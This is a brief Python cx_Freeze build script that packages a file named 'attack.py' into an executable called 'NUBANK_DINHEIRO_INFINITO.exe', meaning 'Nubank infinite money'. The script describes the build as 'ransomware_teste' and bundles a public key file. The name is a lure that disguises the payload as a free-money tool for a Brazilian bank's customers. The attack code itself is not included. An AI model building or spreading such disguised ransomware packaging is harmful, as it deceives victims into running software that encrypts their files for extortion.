from cx_Freeze import setup, Executable

executables = [Executable('attack.py')]

setup(name='NUBANK_DINHEIRO_INFINITO.exe',
      version='1.0',
      description='ransomware_teste',
      executables=executables,
      options={
          'build_exe': {
              'include_files': ['public_key.pem']
              }
        }
    )